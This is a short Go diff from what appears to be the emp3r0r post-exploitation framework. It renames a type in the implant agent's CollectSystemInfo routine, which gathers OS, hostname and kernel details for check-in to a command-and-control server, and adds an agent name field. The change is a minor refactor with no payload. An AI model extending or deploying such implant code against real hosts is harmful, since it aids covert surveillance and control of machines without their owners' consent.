@@ -73,9 +73,9 @@ func Send2CC(data *emp3r0r_data.MsgTunData) error {
 }
 
 // CollectSystemInfo build system info object
-func CollectSystemInfo() *emp3r0r_data.SystemInfo {
+func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 	log.Println("Collecting system info for checking in")
-	var info emp3r0r_data.SystemInfo
+	var info emp3r0r_data.AgentSystemInfo
 	osinfo := GetOSInfo()
 
 	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
@@ -87,6 +87,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	RuntimeConfig.AgentTag = util.GetHostID(RuntimeConfig.AgentUUID)
 	info.Tag = RuntimeConfig.AgentTag // use hostid
 	info.Hostname = hostname
+	info.Name = strings.Split(info.Tag, "-agent")[0]
 	info.Version = emp3r0r_data.Version
 	info.Kernel = osinfo.Kernel
 	info.Arch = osinfo.Architecture
